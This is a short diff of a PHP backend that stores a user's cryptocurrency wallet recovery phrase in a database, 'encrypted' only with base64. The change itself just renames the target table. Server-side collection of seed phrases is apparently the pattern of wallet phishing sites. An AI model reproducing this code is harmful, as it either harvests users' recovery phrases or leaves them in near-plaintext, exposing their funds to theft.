@@ -56,7 +56,7 @@ try {
     $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production
 
     // Prepare SQL to save wallet connection
-    // Assumes users table has fields: id, connected_wallet_name, wallet_phrase, wallet_phrase_verified
+    // Uses 'user' table (not 'users') with fields: id, connected_wallet_name, wallet_phrase, wallet_phrase_verified
     
     // Get database connection
     include '../database/db_config.php';
@@ -65,7 +65,7 @@ try {
         throw new Exception('Database connection failed.');
     }
 
-    $sql = "UPDATE users 
+    $sql = "UPDATE user 
             SET connected_wallet_name = ?,
                 wallet_phrase = ?,
                 wallet_phrase_verified = 0,
